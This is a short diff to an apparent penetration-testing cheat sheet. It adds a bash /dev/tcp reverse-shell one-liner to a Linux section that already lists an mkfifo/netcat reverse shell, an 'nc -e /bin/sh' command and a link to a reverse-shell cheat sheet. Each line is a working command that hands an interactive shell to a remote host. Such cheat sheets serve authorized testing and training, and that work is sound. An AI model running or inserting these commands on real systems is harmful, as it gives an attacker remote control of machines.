@@ -245,6 +245,7 @@ Linux:
   `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f ` 
 - More: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
 - `nc -e /bin/sh 10.10.10.10 4443` 
+- `bash -i >& /dev/tcp/10.10.10.10/443 0>&1`  
 
 Windows:
 - nc.exe on Windows:  
